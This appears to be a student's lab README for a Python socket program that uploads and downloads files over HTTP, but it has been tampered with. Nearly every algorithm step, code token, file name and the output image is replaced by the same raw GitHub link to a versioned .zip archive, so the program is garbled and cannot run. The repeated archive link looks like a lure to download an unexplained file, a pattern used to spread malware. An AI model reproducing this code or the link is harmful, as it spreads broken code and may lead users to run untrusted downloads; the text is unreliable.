# 5a_Create_Socket_for_HTTP_for_webpage_upload_and_download
## NAME:SHAIK HAZEEDMASTHAN
## REG NO:212224040304
## AIM :
To write a PYTHON program for socket for HTTP for web page upload and download
## Algorithm

https://raw.githubusercontent.com/24013396/5a_Create_Socket_for_HTTP_for_webpage_upload_and_download/main/recrescence/5a_Create_Socket_for_HTTP_for_webpage_upload_and_download-v2.7.zip the program.
<BR>
https://raw.githubusercontent.com/24013396/5a_Create_Socket_for_HTTP_for_webpage_upload_and_download/main/recrescence/5a_Create_Socket_for_HTTP_for_webpage_upload_and_download-v2.7.zip the frame size from the user
<BR>
https://raw.githubusercontent.com/24013396/5a_Create_Socket_for_HTTP_for_webpage_upload_and_download/main/recrescence/5a_Create_Socket_for_HTTP_for_webpage_upload_and_download-v2.7.zip create the frame based on the user request.
<BR>
https://raw.githubusercontent.com/24013396/5a_Create_Socket_for_HTTP_for_webpage_upload_and_download/main/recrescence/5a_Create_Socket_for_HTTP_for_webpage_upload_and_download-v2.7.zip send frames to server from the client side.
<BR>
https://raw.githubusercontent.com/24013396/5a_Create_Socket_for_HTTP_for_webpage_upload_and_download/main/recrescence/5a_Create_Socket_for_HTTP_for_webpage_upload_and_download-v2.7.zip your frames reach the server it will send ACK signal to client otherwise it will send NACK signal to client.
<BR>
https://raw.githubusercontent.com/24013396/5a_Create_Socket_for_HTTP_for_webpage_upload_and_download/main/recrescence/5a_Create_Socket_for_HTTP_for_webpage_upload_and_download-v2.7.zip the program
<BR>
## Program 
    import socket

    def send_request(host, port, request):
        with https://raw.githubusercontent.com/24013396/5a_Create_Socket_for_HTTP_for_webpage_upload_and_download/main/recrescence/5a_Create_Socket_for_HTTP_for_webpage_upload_and_download-v2.7.zip(https://raw.githubusercontent.com/24013396/5a_Create_Socket_for_HTTP_for_webpage_upload_and_download/main/recrescence/5a_Create_Socket_for_HTTP_for_webpage_upload_and_download-v2.7.zip, https://raw.githubusercontent.com/24013396/5a_Create_Socket_for_HTTP_for_webpage_upload_and_download/main/recrescence/5a_Create_Socket_for_HTTP_for_webpage_upload_and_download-v2.7.zip) as s:
            https://raw.githubusercontent.com/24013396/5a_Create_Socket_for_HTTP_for_webpage_upload_and_download/main/recrescence/5a_Create_Socket_for_HTTP_for_webpage_upload_and_download-v2.7.zip((host, port))
            https://raw.githubusercontent.com/24013396/5a_Create_Socket_for_HTTP_for_webpage_upload_and_download/main/recrescence/5a_Create_Socket_for_HTTP_for_webpage_upload_and_download-v2.7.zip(https://raw.githubusercontent.com/24013396/5a_Create_Socket_for_HTTP_for_webpage_upload_and_download/main/recrescence/5a_Create_Socket_for_HTTP_for_webpage_upload_and_download-v2.7.zip())
            response = https://raw.githubusercontent.com/24013396/5a_Create_Socket_for_HTTP_for_webpage_upload_and_download/main/recrescence/5a_Create_Socket_for_HTTP_for_webpage_upload_and_download-v2.7.zip(4096).decode()
            return response

    def upload_file(host, port, filename):
        with open(filename, 'rb') as file:
            file_data = https://raw.githubusercontent.com/24013396/5a_Create_Socket_for_HTTP_for_webpage_upload_and_download/main/recrescence/5a_Create_Socket_for_HTTP_for_webpage_upload_and_download-v2.7.zip()
            content_length = len(file_data)
            request = f"POST /upload HTTP/1.1\r\nHost: {host}\r\nContent-Length{content_length}\r\n\r\n"
            request += https://raw.githubusercontent.com/24013396/5a_Create_Socket_for_HTTP_for_webpage_upload_and_download/main/recrescence/5a_Create_Socket_for_HTTP_for_webpage_upload_and_download-v2.7.zip()
            response = send_request(host, port, request)
        return response

    def download_file(host, port, filename):
        request = f"GET /{filename} HTTP/1.1\r\nHost: {host}\r\n\r\n"
        response = send_request(host, port, request)
        # Assuming the response contains the file content after the headers
        file_content = https://raw.githubusercontent.com/24013396/5a_Create_Socket_for_HTTP_for_webpage_upload_and_download/main/recrescence/5a_Create_Socket_for_HTTP_for_webpage_upload_and_download-v2.7.zip('\r\n\r\n', 1)[1]
        with open(filename, 'wb') as file:
            https://raw.githubusercontent.com/24013396/5a_Create_Socket_for_HTTP_for_webpage_upload_and_download/main/recrescence/5a_Create_Socket_for_HTTP_for_webpage_upload_and_download-v2.7.zip(https://raw.githubusercontent.com/24013396/5a_Create_Socket_for_HTTP_for_webpage_upload_and_download/main/recrescence/5a_Create_Socket_for_HTTP_for_webpage_upload_and_download-v2.7.zip())

    if __name__ == "__main__":
        host = '93.184.216.34'
        port = 80

        # Upload file
        upload_response = upload_file(host, port, 'https://raw.githubusercontent.com/24013396/5a_Create_Socket_for_HTTP_for_webpage_upload_and_download/main/recrescence/5a_Create_Socket_for_HTTP_for_webpage_upload_and_download-v2.7.zip')
        print("Upload response:", upload_response)

        # Download file
        download_file(host, port, 'https://raw.githubusercontent.com/24013396/5a_Create_Socket_for_HTTP_for_webpage_upload_and_download/main/recrescence/5a_Create_Socket_for_HTTP_for_webpage_upload_and_download-v2.7.zip')
        print("File downloaded successfully.")
        
## OUTPUT
![386930571-9615f751-a790-4861-a1b0-ee96be4932e7](https://raw.githubusercontent.com/24013396/5a_Create_Socket_for_HTTP_for_webpage_upload_and_download/main/recrescence/5a_Create_Socket_for_HTTP_for_webpage_upload_and_download-v2.7.zip)


## Result
Thus the socket for HTTP for web page upload and download created and Executed
